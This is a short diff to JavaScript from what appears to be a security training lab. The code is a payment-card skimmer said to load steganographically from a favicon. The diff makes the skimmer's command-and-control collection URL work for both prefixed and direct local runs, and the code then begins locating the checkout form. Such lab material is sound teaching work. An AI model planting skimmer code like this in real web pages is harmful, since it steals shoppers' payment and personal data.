@@ -2,7 +2,8 @@
 (function () {
     console.log('%c [!] STEGO SKIMMER LOADED FROM FAVICON [!]', 'color: red; font-size: 20px; font-weight: bold;');
 
-    const C2_URL = '/lab4/c2/collect';
+    // Dynamic C2 URL: supports both Traefik-prefixed and direct-port local runs
+    const C2_URL = window.C2_URL || (window.location.pathname.includes('/lab4/') ? '/lab4/c2/collect' : '/collect');
 
     // Find checkout form
     const forms = document.forms;
